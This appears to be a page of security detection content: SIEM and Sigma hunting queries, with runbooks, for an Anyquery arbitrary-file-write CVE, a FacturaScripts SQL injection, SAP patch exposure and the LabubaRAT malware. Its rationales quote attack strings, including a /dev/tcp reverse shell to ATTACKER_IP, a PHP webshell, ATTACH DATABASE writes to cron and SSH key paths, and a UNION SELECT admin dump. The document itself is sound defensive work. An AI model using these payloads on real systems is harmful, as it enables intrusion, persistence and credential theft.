| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Network_Traffic.All_Traffic where All_Traffic.app=anyquery All_Traffic.direction=inbound by All_Traffic.src All_Traffic.dest All_Traffic.dest_port All_Traffic.app
| `drop_dm_object_name(All_Traffic)`
| convert timeformat="%Y-%m-%dT%H:%M:%S" ctime(firstTime) ctime(lastTime)
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Network_Traffic.All_Traffic where All_Traffic.app=anyquery All_Traffic.direction=inbound by All_Traffic.src All_Traffic.dest All_Traffic.dest_port All_Traffic.app
| `drop_dm_object_name(All_Traffic)`
| convert timeformat="%Y-%m-%dT%H:%M:%S" ctime(firstTime) ctime(lastTime)
Anyquery process writing files to cron/webroot/SSH persistence paths (ATTACH DATABASE AFW) AIInstallation High
Highest-fidelity detection for CVE-2026-50006: the Anyquery process itself creating files under cron directories, web roots, or SSH key paths. ATTACH DATABASE materialises a SQLite file at the attacker-chosen path, so a write by anyquery into /etc/cron.d, /var/spool/cron, /var/www, or /root/.ssh is a direct exploitation signal. Rationale: Combines the article's exact write targets (/etc/cron.d/pwn, /var/spool/cron/crontabs, /var/www/html/shell.php, /root/.ssh/authorized_keys) with the initiating process being anyquery — a database-federation tool that has no legitimate reason to write into cron/webroot/SSH. Datadog omitted because auditd file-target-path is not in the standard Datadog Linux schema. Cross-checked against: • https://github.com/advisories/GHSA-xrcf-6jh3-ggvx
ATT&CKT1190 T1053.003 T1505.003
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Backup/restore tooling copying an Anyquery .db into /var/www or a home directory
  • Sysadmin manually redirecting Anyquery output to a file under an atypical path
  • Anyquery legitimately configured with its data directory pointed at a shared web-served folder
  • Config-management (Ansible/Puppet) running as the anyquery service account writing crontab entries
Suppression filter
| where not (FolderPath has "/var/www" and FileName endswith ".db" and InitiatingProcessCommandLine has "--datadir")
Response runbook
1) Triage: inspect the written file — a valid SQLite header (`SQLite format 3`) followed by cron/PHP/SSH-key text confirms the ATTACH DATABASE abuse. Note the target path and owning UID. 2) Contain: delete the malicious file, kill the anyquery process, isolate the host, and upgrade to >= 0.4.5. 3) Hunt: check cron execution and web/PHP process trees for the injected reverse-shell payload and review /root/.ssh/authorized_keys for attacker keys.
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "anyquery"
| where FolderPath has_any ("/etc/cron.d", "/var/spool/cron", "/etc/cron.hourly", "/etc/cron.daily", "/etc/crontab", "/var/www", "/root/.ssh") or FileName =~ "authorized_keys"
| project Timestamp, DeviceName, InitiatingProcessAccountName, FolderPath, FileName, ActionType, InitiatingProcessCommandLine
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActingProcessName has "anyquery"
| where TargetFilePath has_any ("/etc/cron.d", "/var/spool/cron", "/etc/cron.hourly", "/etc/cron.daily", "/etc/crontab", "/var/www", "/root/.ssh", "authorized_keys")
| project TimeGenerated, DvcHostname, ActorUsername, TargetFilePath, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

ATTACH DATABASE statement targeting persistence paths in Anyquery query logs AIExploitation Medium
Hunts application/syslog output from the Anyquery server for the literal ATTACH DATABASE statement pointed at a sensitive filesystem path — the exploitation primitive of CVE-2026-50006 captured at the query layer before or as the file write occurs. Rationale: Directly hunts the article's exploitation string `ATTACH DATABASE '/etc/cron.d/pwn'` / `'/var/www/html/shell.php'` at the query layer, per reviewer request. Defender/Falcon left empty because SQL query text is application-log data not present in EDR/FDR endpoint schemas; deployability depends on Anyquery query logging being enabled and forwarded to syslog. Cross-checked against: • https://github.com/advisories/GHSA-xrcf-6jh3-ggvx
ATT&CKT1190
Data sources
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate administrator using ATTACH DATABASE to mount a secondary DB during maintenance
  • Security-team validation/PoC testing of the CVE against a lab instance
  • Application code that legitimately attaches a scratch DB under /tmp or the data dir
  • Log lines quoting the advisory text in an ops/incident channel forwarded to syslog
Suppression filter
| where not (SyslogMessage has "ATTACH DATABASE" and SyslogMessage has_any ("/tmp/", "--datadir"))
Response runbook
1) Triage: read the full statement — a target path outside the Anyquery data directory (cron/webroot/SSH) is malicious; note the client IP if the log records it. 2) Contain: block the source IP, restrict/patch the listener (>= 0.4.5). 3) Hunt: confirm the corresponding file write (AFW use case) and any resulting cron/webshell reverse-shell execution on the host.
Syslog
| where TimeGenerated > ago(7d)
| where ProcessName has "anyquery" or SyslogMessage has "anyquery"
| where SyslogMessage has "ATTACH DATABASE"
| where SyslogMessage has_any ("/etc/cron", "/var/www", "/root/.ssh", "/var/spool/cron", ".php", "authorized_keys")
| project TimeGenerated, Computer, ProcessName, SyslogMessage
| order by TimeGenerated desc
source:linux.syslog @process.name:anyquery (*"ATTACH DATABASE"* OR *"attach database"*) (*/etc/cron* OR */var/www* OR */root/.ssh* OR */var/spool/cron* OR *.php*)
APPLICATION
index=* (sourcetype=anyquery OR source="*anyquery*" OR sourcetype=syslog) "ATTACH DATABASE" ("/etc/cron" OR "/var/www" OR "/root/.ssh" OR "/var/spool/cron" OR ".php")
| stats count min(_time) as firstTime max(_time) as lastTime values(_raw) as sample by host
| convert timeformat="%Y-%m-%dT%H:%M:%S" ctime(firstTime) ctime(lastTime)
Reverse shell via cron/webshell payload dropped through Anyquery AFW (/dev/tcp) AICommand & Control High
Detects execution of the reverse-shell payload the article writes via ATTACH DATABASE: a cron- or web-server-parented shell invoking a /dev/tcp bash reverse connection. This is the downstream RCE stage after the arbitrary file write of CVE-2026-50006. Rationale: Matches the article's exact PoC payload `bash -i >& /dev/tcp/ATTACKER_IP/1337 0>&1` executed from a cron parent, plus the PHP webshell `system($_GET[cmd])` spawning shells from php/httpd/nginx. The /dev/tcp + service-parent pairing is high-fidelity and article-specific. Cross-checked against: • https://github.com/advisories/GHSA-xrcf-6jh3-ggvx
ATT&CKT1059.004 T1053.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate cron-scheduled health-check scripts using /dev/tcp to test port reachability
  • Developer debugging a service with a bash /dev/tcp one-liner
  • Monitoring agents that shell out from php-fpm/nginx for diagnostics
  • CI/CD job under a web-server account running network test snippets
Suppression filter
| where not (InitiatingProcessCommandLine has "healthcheck" or ProcessCommandLine has "healthcheck")
Response runbook
1) Triage: extract the reverse-shell destination IP/port from the command line and confirm the parent (cron entry or web PID); pull the offending cron file / webshell. 2) Contain: isolate the host, kill the shell and parent, block the C2 IP at the firewall. 3) Hunt: trace back to the Anyquery file-write and ATTACH DATABASE query that dropped the payload, and sweep other hosts running vulnerable Anyquery for identical cron/webroot artifacts.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("cron","crond","php","php-fpm","apache2","httpd","nginx","sh","bash")
| where ProcessCommandLine has "/dev/tcp/" or (ProcessCommandLine has "bash" and ProcessCommandLine has_any (">& /dev/tcp","0>&1"))
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("cron","crond","php","php-fpm","apache2","httpd","nginx")
| where TargetProcessCommandLine has "/dev/tcp/" or TargetProcessCommandLine has "0>&1"
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, TargetProcessName, TargetProcessCommandLine
| order by TimeGenerated desc

SAP July 2026 Patch Day exposure hunt — critical NetWeaver/Approuter/Commerce Cloud CVEs (internet-facing first) AIExploitation High
Surfaces managed hosts still carrying the three critical July-2026 SAP flaws (CVE-2026-44747 NetWeaver AS ABAP memory corruption, CVE-2026-27690 Approuter HTTP request smuggling, CVE-2026-44761 Commerce Cloud default OAuth2 client) via Defender Vulnerability Management, and ranks them by internet exposure so the two unauthenticated flaws are triaged first. This is an exposure/attack-surface hunt, not a behavioral detection — the article reports no in-the-wild exploitation and publishes no IOCs, and SAP application-layer exploitation telemetry (ICF/ICM HTTP logs, SAP Security Audit Log) is not available in XDR/Sentinel here. Rationale: Anchored on the three exact CVE IDs from the article/Onapsis note (CVE-2026-44747/-27690/-44761) plus SoftwareVendor 'sap'; the DeviceInfo.IsInternetFacing join operationalizes the article's key risk split — CVE-2026-27690 and CVE-2026-44761 are unauthenticated, so internet-exposed vulnerable SAP hosts are the priority. No behavioral query is shippable because the article publishes no exploit strings and reports no ITW activity. Cross-checked against: • https://www.securityweek.com/sap-patches-critical-vulnerabilities-in-netweaver-approuter-commerce-cloud/ • https://www.bleepingcomputer.com/news/security/sap-warns-of-critical-flaws-in-netweaver-and-commerce-cloud/ • https://onapsis.com/blog/sap-security-patch-day-july-2026/
ATT&CKT1190 T1078.001
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Stale TVM inventory — host already patched with the ABAP Kernel update but not yet re-scanned, so the CVE still shows as present
  • Decommissioned or offline SAP hosts lingering in the software inventory
  • Non-production dev/QA SAP NetWeaver or Commerce Cloud sandboxes flagged alongside production (real exposure but different urgency)
  • CVE-2026-44761 flagged on Commerce Cloud instances where the sample OAuth2 client was already removed or its secret rotated (customer not actually impacted, per Onapsis)
  • Third-party or bundled software mis-attributed to vendor 'SAP' by the TVM catalog
Response runbook
1) Triage: sort the result set by IsInternetFacing desc — internet-facing hosts carrying CVE-2026-27690 (Approuter) or CVE-2026-44761 (Commerce Cloud) are unauthenticated and top priority; confirm each host's SAP component/version against the July-2026 SAP Security Notes and whether the RecommendedSecurityUpdate is applied. 2) Contain: for internet-facing NetWeaver ABAP hosts, apply the ABAP Kernel patch or Onapsis's interim workaround (disable the affected ICF nodes in transaction SICF); for Commerce Cloud, audit for the sample OAuth2 client and delete it or rotate the hard-coded secret. 3) Hunt: pull SAP ICM/ICF HTTP access logs and the SAP Security Audit Log (SM20/SAL) on the confirmed-vulnerable hosts for anomalous OAuth token grants, malformed/duplicated HTTP request framing, or unexpected API reads/writes since the patch-day disclosure.

FacturaScripts CVE-2026-45262: parenthesis-bypass SQLi in REST API filter parameter AIExploitation High
Hunts the CVE-2026-45262 exploit where the /api/3 filter[] key contains both '(' and ')' to bypass Where::sqlColumn identifier escaping and inject a UNION SELECT. Targets the specific FacturaScripts REST routes (/api/3/clientes, /api/3/attachedfiles) with a filter key carrying parentheses plus SQL keywords. Rationale: Anchors on the exact CVE-2026-45262 sink prerequisites from the article: the /api/3/clientes and /api/3/attachedfiles routes, a filter[] key that must contain both '(' and ')' to reach the un-escaped branch of Where::sqlColumn, and the UNION SELECT ... FROM users WHERE(nick='admin')-- payload. url_decode() normalises the %28/%29/%20 encoding the article shows. Cross-checked against: • https://www.sentinelone.com/vulnerability-database/cve-2026-25513/ • https://www.sentinelone.com/vulnerability-database/cve-2026-25514/ • https://github.com/NeoRazorX/facturascripts/security/advisories/GHSA-g6w2-q45f-xrp4
ATT&CKT1190 T1505.003
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate API clients using expression columns like filter[lower(nombre)] or filter[LOWER(cifnif)] which also contain parentheses (article notes the branch exists to support LOWER()/UPPER() columns)
  • Security scanners / DAST tools (Burp, sqlmap, Acunetix) probing the tenant during authorised pentests
  • Analysts pasting an encoded PoC URL into a browser against a staging host
  • Web-app firewalls that rewrite/annotate query strings and inject SQL-looking tokens into the logged URL
Suppression filter
| where not(DecodedUrl matches regex @"filter\[(lower|upper)\([a-z0-9_]+\)\]") // drop legitimate expression-column filters
Response runbook
1) Triage: pull the full DecodedUrl and SrcIpAddr; confirm the filter[] key literally contains parentheses + a SQL verb (UNION/SELECT/FROM users) rather than a legitimate LOWER()/UPPER() column. Check HttpStatusCode==200 and HttpResponseBodyBytes for a large body indicating a successful dump. 2) Contain: block the SrcIpAddr at the WAF, revoke every FacturaScripts ApiKey (attacker likely captured admin logkey/password hash), force admin password reset, and confirm FacturaScripts is patched past the fixed release. 3) Hunt: pivot on the same SrcIpAddr for subsequent 200s to /AdminPlugins, /AdminHome and other /Admin* routes (leaked logkey reuse), and search for repeated filter[] parenthesis payloads across all /api/3/* resources.
ImWebSession
| where TimeGenerated > ago(7d)
| extend DecodedUrl = tolower(url_decode(Url))
| where DecodedUrl contains "/api/3/"
| where DecodedUrl contains "filter"
| where DecodedUrl contains "(" and DecodedUrl contains ")"     // Where::sqlColumn parenthesis-exemption trigger
| where DecodedUrl has_any ("union", "select", "from users", "information_schema", "-- ")
| project TimeGenerated, SrcIpAddr, HttpMethod, DstHostname, Url, DecodedUrl, HttpStatusCode, HttpResponseBodyBytes
| order by TimeGenerated desc
title: FacturaScripts CVE-2026-45262 parenthesis-bypass SQLi in REST API filter parameter
id: 3a1c9d4e-7b2f-4e6a-9c1d-8f2a6b5e4d31
description: Detects UNION-based SQL injection through the FacturaScripts /api/3 filter[] key using a parenthesised identifier to bypass Where::sqlColumn escaping (CVE-2026-45262).
references:
  - https://github.com/advisories/GHSA-5qmh-x653-g8qj
author: SOC Detection Engineering
date: 2026/07/15
tags:
  - attack.t1190
  - attack.t1505.003
logsource:
  category: webserver
detection:
  selection_path:
    c-uri|contains: '/api/3/'
  selection_filter:
    c-uri|contains: 'filter'
  selection_paren:
    c-uri|contains:
      - '('
      - '%28'
  selection_sql:
    c-uri|contains:
      - 'UNION'
      - 'union'
      - 'SELECT'
      - 'select'
      - 'FROM users'
      - 'nick='
  condition: selection_path and selection_filter and selection_paren and selection_sql
level: high

FacturaScripts CVE-2026-45262: admin takeover via leaked logkey reuse to /AdminPlugins AIInstallation Medium
Correlates a source IP that sent the parenthesis-bypass SQLi against /api/3 with a subsequent HTTP 200 to admin routes (/AdminPlugins, /AdminHome). In the PoC the SQLi leaked the admin logkey cookie, which was replayed to reach the admin plugin-management UI — this is the account-takeover step. Rationale: Encodes the article's end-to-end takeover: the leaked logkey cookie was injected into a fresh jar and 'GET /AdminPlugins returned 200 with the admin plugin management UI.' Correlating a 200 to /AdminPlugins or /AdminHome from the same SrcIp that submitted the filter[] parenthesis SQLi is high-fidelity because normal API clients never touch the admin UI. Cross-checked against: • https://www.sentinelone.com/vulnerability-database/cve-2026-25513/
ATT&CKT1078 T1539
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A genuine administrator who both uses the API and manages plugins from the same egress IP (small single-tenant deployments)
  • Shared corporate NAT/proxy where API traffic and admin browsing exit the same public IP
  • Vulnerability scanner that crawls both /api/3 and /Admin* routes in one authorised assessment
  • Load balancer health checks or synthetic monitors hitting admin endpoints
Response runbook
1) Triage: confirm the SqliFirst timestamp precedes the /AdminPlugins 200, and that the SrcIp's SQLi query carried a real UNION/nick= payload. Compare the SrcIp against the admin's known office/VPN ranges. 2) Contain: invalidate all active FacturaScripts sessions (rotate logkey/secret), force admin credential reset, disable/rotate every ApiKey, and block the SrcIp. 3) Hunt: enumerate other /Admin* routes hit by the SrcIp (plugin installs, user creation), review FacturaScripts audit/plugin directories for newly added plugins or webshells, and check for outbound connections from the FacturaScripts host.
let LookbackDays = 7d;
let SqliSources = ImWebSession
    | where TimeGenerated > ago(LookbackDays)
    | extend DecodedUrl = tolower(url_decode(Url))
    | where DecodedUrl contains "/api/3/" and DecodedUrl contains "filter"
    | where DecodedUrl contains "(" and DecodedUrl contains ")"
    | where DecodedUrl has_any ("union", "select", "from users", "nick=")
    | summarize SqliFirst = min(TimeGenerated) by SrcIpAddr;
ImWebSession
| where TimeGenerated > ago(LookbackDays)
| extend DecodedUrl = tolower(url_decode(Url))
| where DecodedUrl has_any ("/adminplugins", "/adminhome")
| where HttpStatusCode == 200
| join kind=inner SqliSources on SrcIpAddr
| where TimeGenerated >= SqliFirst        // admin access AFTER the injection
| project TimeGenerated, SqliFirst, SrcIpAddr, DstHostname, Url, HttpStatusCode
| order by TimeGenerated desc

FacturaScripts /api/3/clientes response-size anomaly (SQLi data dump) AIActions on Objectives Medium
Flags /api/3/clientes responses whose body is far larger than the endpoint's baseline while the request carries a filter[] parameter — the signature of a UNION SELECT dumping the users table (password hash + logkey) through the clientes serialiser. Distinct pivot from the request-signature UC: it catches a successful exfil even if the payload encoding evaded the request-side rule. Rationale: The article states the injected UNION mirrors the clientes table's 32 columns so the leaked admin hash/logkey are returned inside the JSON 'cifnif' key — a successful dump inflates the response body well above a normal clientes read. Pairing the size anomaly with the presence of a filter[] parameter keeps it article-specific. Cross-checked against: • https://www.sentinelone.com/vulnerability-database/cve-2026-25514/
ATT&CKT1190 T1005
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate bulk exports / large limit= page reads of the clientes list
  • Reporting or ETL integrations that pull the full customer table
  • First run after a data import when clientes row count spikes
  • A tenant with genuinely large customer records (long notes/addresses) skewing the P95
Suppression filter
| where not(DecodedUrl contains "limit=" and not(DecodedUrl contains "(")) // keep injection-shaped filters, drop plain large paged reads
Response runbook
1) Triage: inspect the request's filter[] value for parenthesis + UNION/SELECT tokens and the SrcIp; a legitimate bulk read will use limit=/offset= not a parenthesised filter key. 2) Contain: if the filter carries injection syntax, treat as confirmed dump — rotate admin credentials, all ApiKeys and the app secret, and block the SrcIp. 3) Hunt: review the same SrcIp for /api/3 requests against other resources (proveedores, users, attachedfiles) and for subsequent admin-UI access via leaked logkey.
let Baseline = ImWebSession
    | where TimeGenerated between (ago(30d) .. ago(1d))
    | extend DecodedUrl = tolower(url_decode(Url))
    | where DecodedUrl contains "/api/3/clientes"
    | summarize P95 = percentile(HttpResponseBodyBytes, 95);
let P95Bytes = toscalar(Baseline | project P95);
ImWebSession
| where TimeGenerated > ago(1d)
| extend DecodedUrl = tolower(url_decode(Url))
| where DecodedUrl contains "/api/3/clientes"
| where DecodedUrl contains "filter"
| where HttpResponseBodyBytes > (P95Bytes * 3)    // 3x the 95th-percentile normal clientes response body
| project TimeGenerated, SrcIpAddr, DstHostname, Url, HttpResponseBodyBytes, P95Bytes, HttpStatusCode
| order by HttpResponseBodyBytes desc

| tstats summariesonly=false count values(Web.status) as status from datamodel=Web where Web.uri_path="/api/3/clientes" by Web.src, Web.uri_query, Web.bytes_out, _time span=1m | `drop_dm_object_name(Web)` | eventstats p95(bytes_out) as p95_bytes | where bytes_out > (p95_bytes*3) AND like(uri_query,"%filter%") | sort - bytes_out
FacturaScripts filter[] SQLi obfuscation: multiple distinct encodings from one source AIExploitation Medium
Detects a single source submitting several distinct encodings of a filter[] SQL-injection payload (mixed %28/%29, %20, /**/, case variation) to the /api/3 API within a short window — WAF-evasion / payload-tuning behaviour against the CVE-2026-45262 parenthesis bypass. Aggregation pivot on source, complementary to the single-request signature rule. Rationale: The article's PoC mixes literal syntax with %20/%28/%5B encoding and comment tokens (-- ); an attacker tuning the parenthesis bypass against a WAF will emit multiple distinct encodings of the same logical filter payload. Keying dcount on the raw (encoded) filter token surfaces that variation while the decoded-token filter keeps it scoped to SQLi attempts. Cross-checked against: • https://github.com/advisories/GHSA-5qmh-x653-g8qj
ATT&CKT1027 T1190
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Authorised DAST/sqlmap runs which by design mutate payload encodings rapidly
  • A buggy client retrying the same filter with slightly different URL-encoding libraries
  • Fuzzing during QA of a new API integration
  • Browser vs. mobile-app clients double-encoding the same legitimate filter differently
Response runbook
1) Triage: review the make_set of FilterPayloads for the SrcIp — confirm they are encoding variants of a UNION/SELECT/parenthesis payload rather than distinct legitimate filters. 2) Contain: block the SrcIp at the WAF and add a virtual-patch rule rejecting /api/3 filter[] keys containing '(' + ')' with SQL verbs; confirm FacturaScripts is patched. 3) Hunt: check whether any of the variants returned HTTP 200 with an inflated body (successful bypass) and pivot the SrcIp to the admin-takeover and response-size detections.
ImWebSession
| where TimeGenerated > ago(1d)
| extend DecodedUrl = tolower(url_decode(Url))
| where DecodedUrl contains "/api/3/" and DecodedUrl contains "filter"
| where DecodedUrl has_any ("union", "select", "(", "sleep(", "information_schema")
| extend FilterPayload = extract(@"filter[^&]*", 0, tolower(Url))    // raw (still-encoded) filter token so different encodings stay distinct
| summarize DistinctPayloads = dcount(FilterPayload), Payloads = make_set(FilterPayload, 10), Requests = count(), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated) by SrcIpAddr, bin(TimeGenerated, 5m)
| where DistinctPayloads > 3        // >3 distinct filter[] encodings in 5 min = WAF-evasion / payload tuning
| order by DistinctPayloads desc

| tstats summariesonly=false count from datamodel=Web where Web.uri_path="/api/3/*" (Web.uri_query="*filter*") (Web.uri_query="*union*" OR Web.uri_query="*UNION*" OR Web.uri_query="*select*" OR Web.uri_query="*SELECT*" OR Web.uri_query="*%28*" OR Web.uri_query="*(*") by Web.src, Web.uri_query, _time span=5m | `drop_dm_object_name(Web)` | stats dc(uri_query) as distinct_payloads count as requests values(uri_query) as payloads by Web.src, _time | where distinct_payloads > 3

Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
LabubaRAT nvidia-sysruntime.exe launch with runtime C2 config in command line AIInstallation High
Hunts execution of the LabubaRAT loader binary 'nvidia-sysruntime.exe' that impersonates NVIDIA's container runtime toolkit and takes its C2 server (pipicka.xyz) and polling interval as launch arguments — or as a single Base64-encoded argument. Article-specific because the same compiled binary is re-tasked per campaign purely via command line. Rationale: Pivots on the exact named loader 'nvidia-sysruntime.exe' plus the hard IOC pipicka.xyz appearing in the launch arguments (article states C2 + polling interval are passed at runtime, optionally Base64-encoded). Cross-checked against SC Media and the KSEC intel forum. Cross-checked against: • https://www.scworld.com/brief/new-rust-based-rat-named-labubarat-impersonates-nvidia-software • https://forum.ksec.co.uk/t/labubarat-masquerades-as-nvidia-software-to-control-windows-hosts/16186
ATT&CKT1036.005 T1140
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate NVIDIA container runtime tooling that ships a similarly named binary (validate signer + folder path)
  • Security researcher / malware analyst detonating the sample in a sandbox on a monitored corporate host
  • Red-team engagement replaying LabubaRAT TTPs
  • EDR sample-submission automation renaming test binaries to 'nvidia-sysruntime.exe'
Suppression filter
| where not(FolderPath startswith "C:\\Program Files\\NVIDIA" or FolderPath startswith "C:\\Program Files (x86)\\NVIDIA")
Response runbook
1) Triage: pull the full ProcessCommandLine and decode any Base64 argument to recover the C2 host + polling interval; confirm the binary is NOT signed by NVIDIA and not under \Program Files\NVIDIA. 2) Contain: network-isolate the host and kill/quarantine nvidia-sysruntime.exe and its SQLite config DB. 3) Hunt: sweep for the same SHA256/filename org-wide, look for pipicka.xyz DNS/HTTPS beacons, Run-key persistence, and the AV-enumeration behavior on the same host.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName =~ "nvidia-sysruntime.exe" or ProcessCommandLine has "nvidia-sysruntime"
| extend C2Config = case(ProcessCommandLine has "pipicka.xyz","pipicka.xyz", ProcessCommandLine matches regex @"[A-Za-z0-9+/]{40,}={0,2}","base64_arg","none")
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, C2Config, SHA256, InitiatingProcessFileName, InitiatingProcessFolderPath
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where NewProcessName endswith "\\nvidia-sysruntime.exe" or CommandLine has "nvidia-sysruntime"
| extend C2Config = case(CommandLine has "pipicka.xyz","pipicka.xyz", CommandLine matches regex @"[A-Za-z0-9+/]{40,}={0,2}","base64_arg","none")
| project TimeGenerated, Computer, SubjectUserName, NewProcessName, CommandLine, C2Config, ParentProcessName
| order by TimeGenerated desc
title: LabubaRAT nvidia-sysruntime.exe Launch with Runtime C2 Config
id: 6c2f0b7a-2d5e-4f1c-9b3a-8d1e4a7c9f21
description: Detects execution of the LabubaRAT loader nvidia-sysruntime.exe that impersonates NVIDIA and receives its pipicka.xyz C2 via command line.
references:
  - https://thehackernews.com/2026/07/labubarat-masquerades-as-nvidia.html
  - https://www.scworld.com/brief/new-rust-based-rat-named-labubarat-impersonates-nvidia-software
author: SOC Detection Engineering
date: 2026/07/15
tags:
  - attack.t1036.005
  - attack.t1140
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    - Image|endswith: '\nvidia-sysruntime.exe'
    - CommandLine|contains: 'nvidia-sysruntime'
  selection_c2:
    CommandLine|contains: 'pipicka.xyz'
  condition: selection_img and selection_c2
level: high
source:windows.sysmon @EventID:1 (@Image:(*\nvidia-sysruntime.exe OR *\NVIDIA-sysruntime.exe) OR @CommandLine:(*nvidia-sysruntime* OR *NVIDIA-sysruntime*)) @CommandLine:*pipicka.xyz*
#event_simpleName=ProcessRollup2 (ImageFileName=/nvidia-sysruntime\.exe$/i OR CommandLine=/nvidia-sysruntime/i)
| CommandLine=/pipicka\.xyz/i
| groupBy([aid, ComputerName, ImageFileName, CommandLine, SHA256HashData], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name="nvidia-sysruntime.exe" by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process
| `drop_dm_object_name(Processes)`
| eval c2_config=if(match(process,"(?i)pipicka\.xyz"),"pipicka.xyz",if(match(process,"[A-Za-z0-9+/]{40,}={0,2}"),"base64_arg","none"))
| `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`

LabubaRAT C2 beacon to pipicka.xyz (HTTPS / DNS tunneling) from NVIDIA-impersonating host AICommand & Control High
Hunts network and DNS traffic to the LabubaRAT C2 domain pipicka.xyz, including data-carrying subdomains characteristic of the implant's DNS-tunneling communication path. Article-specific because pipicka.xyz is the confirmed default C2 and DNS tunneling is one of its three named channels (HTTPS, WebView2, DNS). Rationale: pipicka.xyz is the confirmed hard C2 IOC; the subdomain-length logic surfaces the DNS-tunneling channel the article explicitly names. Corroborated by SC Media. Sentinel query rewritten to use DnsEvents.Name/ClientIP (not the invalid IPAddresses column) and ImDnsActivity.DnsQuery. Cross-checked against: • https://www.scworld.com/brief/new-rust-based-rat-named-labubarat-impersonates-nvidia-software • https://forum.ksec.co.uk/t/labubarat-masquerades-as-nvidia-software-to-control-windows-hosts/16186
ATT&CKT1071.001 T1071.004 T1572
Data sourcesNetwork_Resolution.DNS Network_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat-intel/DNS-sinkhole platforms actively resolving pipicka.xyz for enrichment
  • Security appliances pre-resolving IOC domains from a feed
  • Analyst manually querying the domain during investigation from a corporate workstation
  • Passive-DNS / URL-detonation sandbox traffic
Suppression filter
| where not(DeviceName has_any ("sinkhole","ti-","sandbox"))
Response runbook
1) Triage: identify the ContextProcess/InitiatingProcess behind the query — confirm it is nvidia-sysruntime.exe or another non-NVIDIA binary; inspect subdomain entropy/length for tunneled data. 2) Contain: sinkhole/block pipicka.xyz at the resolver and firewall, isolate the querying host. 3) Hunt: pivot to all hosts resolving *.pipicka.xyz in 30d, correlate with nvidia-sysruntime.exe execution and Run-key persistence; capture beaconing interval to recover the polling-interval config.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl endswith "pipicka.xyz" or RemoteUrl contains ".pipicka.xyz"
| extend Subdomain = tostring(split(RemoteUrl, ".pipicka.xyz")[0])
| extend TunnelingSuspected = iff(strlen(Subdomain) > 30, "yes", "no")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, RemotePort, Protocol, TunnelingSuspected
| order by Timestamp desc
union isfuzzy=true
(ImDnsActivity | where TimeGenerated > ago(30d) | where DnsQuery has "pipicka.xyz" | project TimeGenerated, Src=SrcIpAddr, Host=DvcHostname, Query=DnsQuery, Src2="", Source=EventProduct),
(DnsEvents | where TimeGenerated > ago(30d) | where Name has "pipicka.xyz" | project TimeGenerated, Src=ClientIP, Host=Computer, Query=Name, Src2=QueryType, Source="MicrosoftDNS"),
(CommonSecurityLog | where TimeGenerated > ago(30d) | where DestinationDnsDomain has "pipicka.xyz" or RequestURL has "pipicka.xyz" | project TimeGenerated, Src=SourceIP, Host=DestinationHostName, Query=coalesce(DestinationDnsDomain, RequestURL), Src2=DestinationIP, Source=DeviceProduct)
| order by TimeGenerated desc

NVIDIA-branded process spawns shell / LOLBin (LabubaRAT operator tasking) AIExploitation Medium
Hunts any process whose image name starts with 'nvidia' spawning cmd/powershell/script hosts/LOLBins — legitimate NVIDIA software does not launch interactive shells. Captures LabubaRAT's command-execution, PowerShell-execution and JavaScript-execution operator capabilities running under its NVIDIA masquerade. Rationale: Article states LabubaRAT masquerades as NVIDIA software and supports command/PowerShell/JavaScript execution; genuine NVIDIA binaries never parent interactive shells, making the nvidia-parent → shell-child pair high-signal for the malware's operator tasking. Cross-checked against: • https://www.scworld.com/brief/new-rust-based-rat-named-labubarat-impersonates-nvidia-software
ATT&CKT1036.005 T1059.001 T1059.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • GeForce Experience / NVIDIA installer legitimately shelling out to run driver-cleanup scripts
  • NVIDIA telemetry or crash-reporter invoking rundll32 during driver install
  • IT deployment tooling wrapping a renamed nvidia*.exe launcher
  • Third-party 'nvidia'-prefixed OEM utility spawning cmd for a config task
Suppression filter
| where not(InitiatingProcessFolderPath startswith "C:\\Program Files\\NVIDIA" or InitiatingProcessFolderPath startswith "C:\\Program Files (x86)\\NVIDIA")
Response runbook
